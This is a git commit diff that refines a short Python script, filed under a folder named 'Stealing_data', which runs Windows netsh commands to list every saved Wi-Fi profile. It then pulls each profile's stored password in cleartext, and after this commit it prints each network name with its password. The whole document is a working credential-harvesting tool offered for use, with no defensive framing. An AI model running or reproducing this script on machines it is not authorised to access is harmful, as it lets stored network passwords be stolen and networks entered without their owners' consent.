8513125bd279e2b855fbdcdadded37390675946b
Vijayakumar Kannan <imvijay29@gmail.com>
2020-05-10 13:50:14 +0530

    improvements

--- Stealing_data/get_windows_wifi_passwords.py
+++ Stealing_data/get_windows_wifi_passwords.py
@@ -1,14 +1,17 @@
 #!/usr/bin/python
+# -*- coding: utf-8 -*-
 
 import subprocess
 import re
 
 out = subprocess.check_output("netsh wlan show profile",shell=True)
-print (out)
 wifi_nw_list = re.findall(b"(?:Profile\s*:\s)(.*)", out)
 
 for name in wifi_nw_list:
     command = 'netsh wlan show profile "{}" key=clear'.format(name.decode(encoding='UTF-8'))
     current_result = subprocess.check_output(command ,shell=True)
-    print (current_result.decode(encoding='UTF-8'))
-    print ("--x--"*30)
+    # print (current_result.decode(encoding='UTF-8'))
+    wifi_passd = re.search(b"(?:Key\sContent\s*:\s)(.*)", current_result)
+    if wifi_passd:
+        print ('WiFi : {},  Password : {}'.format(name.strip(), wifi_passd.group(1).strip()))
+    print ("--x--"*10)
